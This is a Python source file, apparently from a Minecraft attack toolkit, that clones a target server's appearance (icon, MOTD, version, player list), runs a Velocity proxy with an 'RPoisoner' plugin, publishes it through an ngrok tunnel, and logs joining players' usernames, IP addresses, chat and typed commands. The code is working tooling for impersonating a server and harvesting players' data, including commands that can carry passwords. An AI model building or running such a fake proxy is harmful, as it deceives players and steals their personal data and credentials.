import base64
import datetime
import os
import shutil
import subprocess
import time

from utils.checks.check_encoding import check_encoding
from utils.checks.check_ngrok import check_ngrok
from utils.color.mini_messages_format import minimessage_colors
from utils.color.text_color import paint
from utils.gets.get_ip_ngrok import get_ip_ngrok
from utils.managers.language_manager import language_manager
from utils.gets.get_log_file import create_file
from utils.managers.logs_manager import LogsManager
from utils.managers.config_manager import config_manager
from utils.minecraft.server_data import GetDataFromMinecraftServer
from utils.writefile.write_file import WriteFile
from utils.gets.get_spaces import get_spaces


def start_velocity(server, mode, fakeproxy=False):
    """ 
    Start the velocity.jar

    Args:
        server (str): Server IP and port
        mode (str): Velocity Forwarding mode
        fakeproxy (bool): True if the command is Fakeproxy, False if the command is velocity.

    Returns:
        None
    """

    data_file = f'utils/velocity/fakeproxy/plugins/RPoisoner/data.txt'
    data_line = 0
    t = ''
    ip_ngrok = None

    try:
        paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{language_manager.language["proxyMessages"]["configuring"]}')
        time.sleep(1)

        # Copy the velocity setting.
        with open('utils/otherfiles/velocity_settings', 'r', encoding=check_encoding('utils/otherfiles/velocity_settings')) as f:
            velocity_settings = f.read()

        if fakeproxy:
            # Set the configuration values.
            velocity_settings = velocity_settings.replace('[[PORT]]', config_manager.config['proxyConfig']['fakeProxyPort']).replace('[[MODE]]', mode.lower()).replace('[[ADDRESS]]', server)
            port = config_manager.config['proxyConfig']['fakeProxyPort']
            location = 'fakeproxy'

        else:
            # Set the configuration values.
            velocity_settings = velocity_settings.replace('[[PORT]]', config_manager.config['proxyConfig']['velocityPort']).replace('[[MODE]]', mode.lower()).replace('[[ADDRESS]]', server)
            port = config_manager.config['proxyConfig']['velocityPort']
            location = 'velocity'

        if fakeproxy:
            # Create and configure the log file.
            file = create_file('fakeproxy')
            logs = LogsManager('fakeproxy', file)
            logs.create(server, mode.capitalize())

            paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{language_manager.language["commands"]["fakeproxy"]["copyingData"]}')
            # Gets the data from the server.
            server_data = GetDataFromMinecraftServer(server)
            data = server_data.get_information()
            time.sleep(0.5)

            # In the event that the server does not respond.
            if data is None:
                paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{language_manager.language["commands"]["fakeproxy"]["errorWhenCopying"]}')
                return

            # In case the server is not Java.
            if data[0] != 'Java':
                paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{language_manager.language["commands"]["fakeproxy"]["errorBedrockServer"]}')
                return

            # If the server has an image.
            if data[8] is not None:
                with open(f'utils/velocity/fakeproxy/server-icon.png', 'wb') as f:
                    f.truncate(0)
                    icon = data[8].replace('data:image/png;base64,', '')
                    icon = base64.b64decode(icon)
                    f.write(icon)

            # If the server doesn't have an image, copy the default image from Minecraft.
            else:
                shutil.copy('utils/otherfiles/server-icon.png', f'utils/velocity/fakeproxy/server-icon.png')

            try:
                WriteFile(f'utils/velocity/{location}/plugins/RPoisoner/config/commandPrefix', True, 'w+', config_manager.config['proxyConfig']['fakeProxyCommandPrefix'])

            except FileNotFoundError:
                pass

            # If the user has ngrok.
            if check_ngrok():
                paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{language_manager.language["commands"]["fakeproxy"]["ngrokStart"]}')

                # Run the ngrok command.
                ngrok = subprocess.Popen(f'{config_manager.config["commands"]["ngrok"]} tcp {config_manager.config["proxyConfig"]["fakeProxyPort"]}', stdout=subprocess.PIPE, shell=True)
                time.sleep(3)
                
                # Gets the IP of ngrok.
                ip_ngrok = get_ip_ngrok()

                # In case the ip of ngrok cannot be obtained.
                if ip_ngrok is None:
                    paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{language_manager.language["commands"]["fakeproxy"]["ipNgrokError"]}')

            else:
                paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{language_manager.language["commands"]["fakeproxy"]["ngrokNotFound"]}')
                ip_ngrok = 'None'

            if os.path.exists(data_file):
                with open(data_file, 'w+', encoding='utf8') as f:
                    f.truncate(0)

        # Configure the server velocity.
        WriteFile(f'utils/velocity/{location}/velocity.toml', True, 'w+', velocity_settings)
        paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{language_manager.language["proxyMessages"]["starting"]}')
        time.sleep(0.5)

        # Start the proxy server.
        proxy = subprocess.Popen(f'cd utils/velocity/{location} && {config_manager.config["commands"]["velocity"]}', stdout=subprocess.PIPE, shell=True)
        time.sleep(3)

        # If the ngrok IP was obtained successfully.
        if ip_ngrok is not None:
            text_ngrok = f'&f&l(&d{ip_ngrok}&f&l)'
            paint(f'\n{get_spaces()}{language_manager.language["proxyMessages"]["proxyServerStarted"].replace("[0]", f"""127.0.0.1:{port}""")} {text_ngrok}')
            paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{language_manager.language["commands"]["fakeproxy"]["waitingForData"]}\n')

        else:
            paint(f'\n{get_spaces()}{language_manager.language["proxyMessages"]["proxyServerStarted"].replace("[0]", f"""127.0.0.1:{port}""")}\n')

    except KeyboardInterrupt:
        paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{language_manager.language["proxyMessages"]["stopping"]}')
        return
    
    while True:
        try:
            time.sleep(int(config_manager.config['proxyConfig']['fakeProxyUpdateDelay']))

            # If the running command is the fakeproxy.
            if fakeproxy:
                # Whether the data file exists.
                if os.path.exists(data_file):
                    # Open the data file.
                    with open(data_file, 'r', encoding=check_encoding(data_file)) as f:
                        content = f.readlines()

                    while True:
                        try:
                            line = content[data_line]
                            line = line.replace('\n', '')
                            player_data = line.split('/#-#/')
                            username = player_data[1]
                            ip_address = player_data[2]
                            username_data = f'&c&l{username} &f&l(&c&l{ip_address}&f&l)'
                            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                            if player_data[0] == '[CONNECTING]':
                                logs.write('save_data_from_fakesrv', f'{current_time} {username} ({ip_address}) has entered the server.\n')
                                paint(f'{get_spaces()}&f{current_time} {language_manager.language["commands"]["fakeproxy"]["connecting"].replace("[0]", username_data)}')

                            if player_data[0] == '[DISCONNECTING]':
                                logs.write('save_data_from_fakesrv', f'{current_time} {username} ({ip_address}) has left the server.\n')
                                paint(f'{get_spaces()}&f{current_time} {language_manager.language["commands"]["fakeproxy"]["disconnecting"].replace("[0]", username_data)}')

                            if player_data[0] == '[CHAT]':
                                message = player_data[3]
                                logs.write('save_data_from_fakesrv', f'{current_time} {username} ({ip_address}) has sent a message: {message}\n')
                                paint(f'{get_spaces()}&f{current_time} {language_manager.language["commands"]["fakeproxy"]["messageCaptured"].replace("[0]", username_data)} &a{message}')

                            if player_data[0] == '[COMMAND]':
                                command = player_data[3]
                                logs.write('save_data_from_fakesrv', f'{current_time} {username} ({ip_address}) has run a command: {command}\n')
                                paint(f'{get_spaces()}&f{current_time} {language_manager.language["commands"]["fakeproxy"]["commandCaptured"].replace("[0]", username_data)} &a{command}')

                            t = '\n'
                            data_line += 1

                        except IndexError:
                            break

                # Gets the data from the server.
                server_data = GetDataFromMinecraftServer(server)
                data = server_data.get_information()

                # If the server had no response or the data was obtained from a port other than the java.
                if data is None or data[0] != 'Java':
                    continue

                # Updates the proxy data with the data obtained from the victim's server.
                WriteFile(f'utils/velocity/{location}/plugins/RPoisoner/settings/onlinePlayers', True, 'w+', data[5])
                WriteFile(f'utils/velocity/{location}/plugins/RPoisoner/settings/maximumPlayers', True, 'w+', data[6])
                WriteFile(f'utils/velocity/{location}/plugins/RPoisoner/settings/protocol', True, 'w+', data[4])
                WriteFile(f'utils/velocity/{location}/plugins/RPoisoner/settings/version', True, 'w+', minimessage_colors(data[3]))
                WriteFile(f'utils/velocity/{location}/plugins/RPoisoner/settings/motd', True, 'w+', minimessage_colors(data[2]))
                WriteFile(f'utils/velocity/{location}/plugins/RPoisoner/settings/samplePlayers', True, 'w+')

                if data[14] is not None:
                    for player in data[14]:
                        WriteFile(f'utils/velocity/{location}/plugins/RPoisoner/settings/samplePlayers', False, 'a', f'{player.name}/#-#/{player.id}\n')

        except KeyboardInterrupt:
            # If the running command is the fakeproxy.
            if fakeproxy:
                # If the user has ngrok.
                if check_ngrok():
                    ngrok.terminate()

            paint(f'{t}    {language_manager.language["prefix"]}{language_manager.language["proxyMessages"]["stopping"]}')
            proxy.terminate()
            return
